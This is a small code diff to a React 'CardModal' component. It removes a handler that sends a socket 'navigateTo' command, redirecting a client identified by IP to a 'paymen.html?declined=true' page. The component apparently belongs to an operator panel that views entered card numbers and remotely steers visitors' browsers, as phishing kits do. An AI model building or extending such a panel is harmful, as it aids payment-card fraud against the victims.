@@ -95,11 +95,6 @@ export default function CardModal({ ip, user, onClose }) {
     hideConfirm();
   };
 
-  const handleDeclineCard = () => {
-    socket.emit("navigateTo", { ip, page: "paymen.html?declined=true" });
-    hideConfirm();
-  };
-
   const formatCard = (n) => (n || "").replace(/(.{4})/g, "$1 ").trim();
 
   const blinkStyle = { backgroundColor: "#d4edda", transition: "background-color 0.3s" };
@@ -211,7 +206,6 @@ export default function CardModal({ ip, user, onClose }) {
         onBasmahChange={setBasmah}
         onConfirm={handleConfirm}
         onDecline={handleDecline}
-        onDeclineCard={handleDeclineCard}
         onClose={hideConfirm}
       />
     </>
